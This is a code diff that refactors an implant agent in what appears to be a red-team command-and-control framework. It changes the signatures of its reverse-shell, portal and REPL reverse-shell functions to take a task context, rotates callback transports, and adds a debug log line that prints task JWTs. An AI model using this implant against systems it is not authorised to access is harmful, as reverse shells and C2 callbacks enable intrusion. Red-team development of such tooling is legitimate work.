@@ -1,8 +1,8 @@
 use anyhow::{Context, Result};
 use eldritchv2::agent::agent::Agent;
 use pb::c2::host::Platform;
-use pb::c2::transport::Type::{self, *};
-use pb::c2::{self, ClaimTasksRequest};
+use pb::c2::transport::Type;
+use pb::c2::{self, ClaimTasksRequest, TaskContext};
 use pb::config::Config;
 use std::collections::{BTreeMap, BTreeSet};
 use std::sync::{Arc, Mutex};
@@ -119,13 +119,13 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
 
     pub async fn rotate_callback_uri(&self) {
         let mut cfg = self.config.write().await;
-        if let Some(info) = cfg.info.as_mut() {
-            if let Some(available_transports) = info.available_transports.as_mut() {
-                let num_transports = available_transports.transports.len();
-                if num_transports > 0 {
-                    let current_idx = available_transports.active_index as usize;
-                    available_transports.active_index = ((current_idx + 1) % num_transports) as u32;
-                }
+        if let Some(info) = cfg.info.as_mut()
+            && let Some(available_transports) = info.available_transports.as_mut()
+        {
+            let num_transports = available_transports.transports.len();
+            if num_transports > 0 {
+                let current_idx = available_transports.active_index as usize;
+                available_transports.active_index = ((current_idx + 1) % num_transports) as u32;
             }
         }
     }
@@ -175,6 +175,9 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         let registry = self.task_registry.clone();
         let agent = Arc::new(self.clone());
         for task in tasks {
+            #[cfg(debug_assertions)]
+            log::info!("Claimed task {}: JWT={}", task.id, task.jwt);
+
             registry.spawn(task, agent.clone());
         }
         Ok(())
@@ -286,22 +289,26 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         Ok(c2::ReportTaskOutputResponse {})
     }
 
-    fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
-        self.spawn_subtask(task_id, move |transport| async move {
-            run_reverse_shell_pty(task_id, cmd, transport).await
+    fn start_reverse_shell(
+        &self,
+        task_context: TaskContext,
+        cmd: Option<String>,
+    ) -> Result<(), String> {
+        self.spawn_subtask(task_context.task_id, move |transport| async move {
+            run_reverse_shell_pty(task_context, cmd, transport).await
         })
     }
 
-    fn create_portal(&self, task_id: i64) -> Result<(), String> {
-        self.spawn_subtask(task_id, move |transport| async move {
-            run_create_portal(task_id, transport).await
+    fn create_portal(&self, task_context: TaskContext) -> Result<(), String> {
+        self.spawn_subtask(task_context.task_id, move |transport| async move {
+            run_create_portal(task_context, transport).await
         })
     }
 
-    fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String> {
+    fn start_repl_reverse_shell(&self, task_context: TaskContext) -> Result<(), String> {
         let agent = self.clone();
-        self.spawn_subtask(task_id, move |transport| async move {
-            run_repl_reverse_shell(task_id, transport, agent).await
+        self.spawn_subtask(task_context.task_id, move |transport| async move {
+            run_repl_reverse_shell(task_context, transport, agent).await
         })
     }
 
